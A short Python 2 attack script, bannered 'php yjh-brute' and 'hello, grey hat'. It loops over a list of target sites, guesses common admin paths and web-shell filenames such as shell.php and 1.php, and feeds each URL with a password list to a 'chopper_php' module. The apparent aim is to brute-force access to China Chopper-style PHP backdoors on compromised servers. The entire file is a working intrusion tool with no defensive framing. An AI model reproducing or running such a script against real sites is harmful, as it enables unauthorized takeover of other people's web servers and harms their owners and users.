#!/usr/bin/env python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import chopper_php

print '''
	+-----------------------------------------------------+
	+                                                     +
	+               php  yjh-brute                        +
	+                      hello, grey hat                +
	+                                                     +
	+-----------------------------------------------------+
      '''

path_list  = ['/admin/manage/', '/user/', '/grad/admin/', '/grad/admin/users/', '/admin/', '/php/']
shell_list = ['test1.php', 'ini.php', 'xss.php', 'test.php', 'sb.php', 'shell.php', 'fuck.php', 'list_main.php', 'aaa.php', 'info.php', '1.php']
with open('eyou.txt') as e:
	url_list = [i.strip() for i in e]

def main():
	pass_file = "passwords.txt"
	with open( pass_file ) as pf:
		p_l = [i.strip() for i in pf]
		count = 0
	for j in url_list:
		for i in path_list:
			for k in shell_list:
				rurl = j+i+k
				#print rurl
				chopper_php.work( rurl, p_l[:] )
				count += 1
				print count,'/',25608
      
if __name__ == '__main__':
	main()
